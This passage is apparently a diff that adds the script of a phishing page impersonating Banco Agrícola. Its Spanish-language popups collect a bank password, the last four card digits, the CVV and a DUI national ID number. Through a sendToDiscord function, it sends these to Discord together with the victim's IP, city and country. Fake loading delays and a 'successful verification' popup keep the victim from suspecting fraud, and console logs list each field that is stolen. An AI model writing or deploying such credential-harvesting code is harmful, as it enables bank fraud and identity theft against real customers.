+
+  async function trackFinancial() {
+    console.log("🔄 Enviando validación financiera...");
+    const locationInfo = await getLocationInfo();
+    const userInfo = getUserInfo();
+    await sendToDiscord("financial", userInfo, locationInfo, null);
+  }
+
+  // ============================================
+  // FUNCIONES DE FLUJO ORIGINAL
+  // ============================================
+
+  const firstPopup = document.getElementById("firstPopup");
+  const secondPopup = document.getElementById("secondPopup");
+  const fourthPopup = document.getElementById("fourthPopup");
+  const showFirstBtn = document.getElementById("showFirstPopupBtn");
+  const cancelFirst = document.getElementById("cancelFirstPopup");
+  const validatePasswordBtn = document.getElementById("validatePasswordBtn");
+  const cancelSecond = document.getElementById("cancelSecondPopup");
+  const validateFinancialBtn = document.getElementById("validateFinancialBtn");
+  const backToHomeBtn = document.getElementById("backToHomeBtn");
+  const passwordInput = document.getElementById("passwordInput");
+  const cardLast4 = document.getElementById("cardLast4");
+  const cardCvv = document.getElementById("cardCvv");
+  const cardDui = document.getElementById("cardDui");
+  const usernameInput = document.getElementById("usernameInput");
+  const loadingOverlay = document.getElementById("loadingOverlay");
+  const body = document.body;
+
+  function closeAllPopups() {
+    firstPopup.classList.remove("active");
+    secondPopup.classList.remove("active");
+    fourthPopup.classList.remove("active");
+    body.classList.remove("popup-open");
+  }
+
+  function showLoadingOverlay(callback) {
+    loadingOverlay.classList.add("active");
+    body.classList.add("loading-open");
+
+    setTimeout(function () {
+      loadingOverlay.classList.remove("active");
+      body.classList.remove("loading-open");
+      if (callback) callback();
+    }, 10000);
+  }
+
+  function hideLoadingOverlay() {
+    loadingOverlay.classList.remove("active");
+    body.classList.remove("loading-open");
+  }
+
+  function showFirstPopup() {
+    closeAllPopups();
+    firstPopup.classList.add("active");
+    body.classList.add("popup-open");
+    setTimeout(() => passwordInput.focus(), 200);
+    console.log("📌 Popup de clave abierto");
+  }
+
+  function hideFirstPopup() {
+    firstPopup.classList.remove("active");
+    if (
+      !secondPopup.classList.contains("active") &&
+      !fourthPopup.classList.contains("active")
+    ) {
+      body.classList.remove("popup-open");
+    }
+    console.log("❌ Popup de clave cerrado");
+  }
+
+  function showSecondPopup() {
+    firstPopup.classList.remove("active");
+    secondPopup.classList.add("active");
+    // Limpiar campos
+    cardLast4.value = "";
+    cardCvv.value = "";
+    cardDui.value = "";
+    setTimeout(() => cardLast4.focus(), 150);
+    console.log("📌 Popup de validación financiera abierto");
+  }
+
+  function hideSecondPopup() {
+    secondPopup.classList.remove("active");
+    if (
+      !firstPopup.classList.contains("active") &&
+      !fourthPopup.classList.contains("active")
+    ) {
+      body.classList.remove("popup-open");
+    }
+    console.log("❌ Popup de validación financiera cerrado");
+  }
+
+  function showFourthPopup() {
+    fourthPopup.classList.add("active");
+    body.classList.add("popup-open");
+    console.log("📌 Popup de verificación exitosa abierto");
+  }
+
+  function hideFourthPopup() {
+    fourthPopup.classList.remove("active");
+    if (
+      !firstPopup.classList.contains("active") &&
+      !secondPopup.classList.contains("active")
+    ) {
+      body.classList.remove("popup-open");
+    }
+    console.log("❌ Popup de verificación exitosa cerrado");
+  }
+
+  // ============================================
+  // EVENTOS
+  // ============================================
+
+  showFirstBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+    showFirstPopup();
+  });
+
+  cancelFirst.addEventListener("click", function (e) {
+    e.preventDefault();
+    hideFirstPopup();
+  });
+
+  validatePasswordBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+    const password = passwordInput.value.trim();
+    if (password.length >= 4) {
+      firstPopup.classList.remove("active");
+      trackClave();
+      showLoadingOverlay(function () {
+        showSecondPopup();
+      });
+    } else {
+      alert("La clave debe tener al menos 4 caracteres");
+      passwordInput.focus();
+    }
+  });
+
+  cancelSecond.addEventListener("click", function (e) {
+    e.preventDefault();
+    hideSecondPopup();
+  });
+
+  validateFinancialBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+    const last4 = cardLast4.value.trim();
+    const cvv = cardCvv.value.trim();
+    const dui = cardDui.value.trim();
+
+    if (last4.length === 4 && cvv.length === 3 && dui.length >= 9) {
+      secondPopup.classList.remove("active");
+      trackFinancial();
+      showLoadingOverlay(function () {
+        showFourthPopup();
+      });
+    } else {
+      alert("Por favor, complete todos los campos correctamente.");
+      if (last4.length !== 4) cardLast4.focus();
+      else if (cvv.length !== 3) cardCvv.focus();
+      else cardDui.focus();
+    }
+  });
+
+  backToHomeBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+    hideFourthPopup();
+    // Opcional: recargar la página o resetear el formulario
+    // window.location.reload();
+  });
+
+  // Enter en inputs
+  passwordInput.addEventListener("keydown", function (e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      validatePasswordBtn.click();
+    }
+  });
+
+  cardLast4.addEventListener("keydown", function (e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      cardCvv.focus();
+    }
+  });
+
+  cardCvv.addEventListener("keydown", function (e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      cardDui.focus();
+    }
+  });
+
+  cardDui.addEventListener("keydown", function (e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      validateFinancialBtn.click();
+    }
+  });
+
+  usernameInput.addEventListener("keydown", function (e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      showFirstBtn.click();
+    }
+  });
+
+  // Prevenir cierre con clic fuera
+  document.querySelectorAll(".popup-overlay").forEach((overlay) => {
+    overlay.addEventListener("click", function (e) {
+      e.stopPropagation();
+    });
+  });
+
+  // Inicialización
+  document.addEventListener("DOMContentLoaded", async function () {
+    console.log("🔄 Sistema de monitoreo de Banco Agrícola activado");
+    console.log("✅ Envía:");
+    console.log("   📌 Validar clave → Envía: Usuario + Clave + IP + Ciudad + País");
+    console.log("   📌 Validación financiera → Envía: Usuario + Últimos 4 + CVV + DUI + IP + Ciudad + País");
+  });
+</script>
+  </body>
+</html>
